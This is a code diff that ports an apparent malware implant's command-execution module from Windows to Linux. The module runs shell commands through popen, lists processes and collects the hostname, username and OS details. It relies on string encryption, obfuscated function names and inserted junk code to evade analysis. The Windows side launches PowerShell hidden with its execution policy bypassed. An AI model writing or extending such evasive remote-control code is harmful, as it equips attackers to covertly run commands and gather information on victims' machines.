@@ -1,17 +1,43 @@
 #pragma once
 #include "obfuscation.h"
-#include <windows.h>
 #include <string>
 #include <sstream>
 #include <memory>
+#include <algorithm>
+#include <vector>
+
+// Cross-platform compatibility layer
+#ifdef _WIN32
+    #include <windows.h>
+#else
+    #include <unistd.h>
+    #include <sys/wait.h>
+    #include <cstdio>
+    #include <cstdlib>
+    #include <cstring>
+    #include <limits.h>
+    #ifndef PATH_MAX
+        #define PATH_MAX 4096
+    #endif
+    #ifndef MAX_PATH
+        #define MAX_PATH PATH_MAX
+    #endif
+#endif
 
 namespace obf = obfuscated;
 
-// Obfuscated command strings
+// Obfuscated command strings (cross-platform)
+#ifdef _WIN32
 constexpr auto CMD_EXE = OBF_STRING("cmd.exe");
 constexpr auto POWERSHELL_EXE = OBF_STRING("powershell.exe");
 constexpr auto CMD_FLAG = OBF_STRING("/c");
 constexpr auto PS_FLAGS = OBF_STRING("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command");
+#else
+constexpr auto CMD_EXE = OBF_STRING("/bin/sh");
+constexpr auto POWERSHELL_EXE = OBF_STRING("/bin/bash");
+constexpr auto CMD_FLAG = OBF_STRING("-c");
+constexpr auto PS_FLAGS = OBF_STRING("-c");
+#endif
 constexpr auto SUCCESS_PREFIX = OBF_STRING("[+] ");
 constexpr auto ERROR_PREFIX = OBF_STRING("[-] ");
 constexpr auto INFO_PREFIX = OBF_STRING("[*] ");
@@ -77,6 +103,7 @@ std::string CommandExecutor::OBF_FUNC_NAME(sanitize_command)(const std::string& 
 std::string CommandExecutor::OBF_FUNC_NAME(execute_with_createprocess)(const std::string& cmd_line) {
     obf::insert_junk_code();
 
+#ifdef _WIN32
     SECURITY_ATTRIBUTES sa;
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.lpSecurityDescriptor = NULL;
@@ -130,6 +157,27 @@ std::string CommandExecutor::OBF_FUNC_NAME(execute_with_createprocess)(const std
     CloseHandle(pi.hThread);
 
     return output.empty() ? INFO_PREFIX.decrypt() + "Command executed successfully" : output;
+#else
+    // Linux implementation using popen
+    FILE* pipe = popen(cmd_line.c_str(), "r");
+    if (!pipe) {
+        return ERROR_PREFIX.decrypt() + "Failed to execute command";
+    }
+
+    std::string output;
+    char buffer[4096];
+    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+        output += buffer;
+        obf::insert_junk_code();
+    }
+
+    int exit_code = pclose(pipe);
+    if (output.empty() && exit_code == 0) {
+        return INFO_PREFIX.decrypt() + "Command executed successfully";
+    }
+
+    return output;
+#endif
 }
 
 std::string CommandExecutor::OBF_FUNC_NAME(execute_cmd)(const std::string& command) {
@@ -187,27 +235,42 @@ std::string CommandExecutor::execute(const std::string& command) {
 
 std::string CommandExecutor::get_current_directory() {
     char buffer[MAX_PATH];
-    DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);
 
+#ifdef _WIN32
+    DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);
     if (result == 0) {
         return ERROR_PREFIX.decrypt() + "Failed to get current directory";
     }
+#else
+    if (getcwd(buffer, MAX_PATH) == nullptr) {
+        return ERROR_PREFIX.decrypt() + "Failed to get current directory";
+    }
+#endif
 
     return INFO_PREFIX.decrypt() + "Current directory: " + std::string(buffer);
 }
 
 bool CommandExecutor::change_directory(const std::string& path) {
     obf::insert_junk_code();
+#ifdef _WIN32
     return SetCurrentDirectoryA(path.c_str()) != 0;
+#else
+    return chdir(path.c_str()) == 0;
+#endif
 }
 
 std::string CommandExecutor::list_processes() {
+#ifdef _WIN32
     return OBF_FUNC_NAME(execute_cmd)("tasklist /fo csv");
+#else
+    return OBF_FUNC_NAME(execute_cmd)("ps aux");
+#endif
 }
 
 std::string CommandExecutor::get_system_info() {
     std::stringstream info;
 
+#ifdef _WIN32
     // Get computer name
     char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = sizeof(computer_name);
@@ -231,6 +294,21 @@ std::string CommandExecutor::get_system_info() {
              << os_info.dwMinorVersion << "."
              << os_info.dwBuildNumber << "\n";
     }
+#else
+    // Linux system info
+    char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) == 0) {
+        info << INFO_PREFIX.decrypt() << "Hostname: " << hostname << "\n";
+    }
+
+    char* username = getenv("USER");
+    if (username) {
+        info << INFO_PREFIX.decrypt() << "User: " << username << "\n";
+    }
+
+    // Get OS info from uname
+    info << OBF_FUNC_NAME(execute_cmd)("uname -a") << "\n";
+#endif
 
     // Get current directory
     info << get_current_directory() << "\n";
